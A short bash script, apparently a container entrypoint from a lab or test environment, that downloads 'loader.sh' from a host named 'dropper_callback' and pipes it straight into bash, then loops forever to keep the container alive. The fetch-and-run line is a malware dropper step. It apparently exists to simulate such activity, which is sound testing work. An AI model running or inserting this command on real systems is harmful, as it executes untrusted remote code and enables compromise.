#!/bin/bash

curl -s http://dropper_callback:8080/loader.sh | bash

# stupid hack to get the container not to shut down
while true; do
  sleep 60
  echo "I'm still awake"
done
